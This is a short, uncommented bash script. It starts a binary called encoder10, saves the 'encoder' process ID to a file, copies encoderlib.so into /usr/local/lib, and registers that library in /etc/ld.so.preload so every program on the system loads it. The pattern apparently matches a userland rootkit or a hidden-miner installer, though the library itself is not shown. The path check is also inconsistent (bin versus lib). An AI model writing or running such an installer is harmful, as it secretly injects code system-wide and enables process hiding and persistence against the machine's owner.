#!/bin/bash
./encoder10

echo $(ps -C encoder -o pid=) > ./pid

if [ ! -f /usr/local/bin/encoderlib.so ]; then
    cp encoderlib.so /usr/local/lib/
fi

if [ ! -f /etc/ld.so.preload ]; then
    echo /usr/local/lib/encoderlib.so >> /etc/ld.so.preload
fi

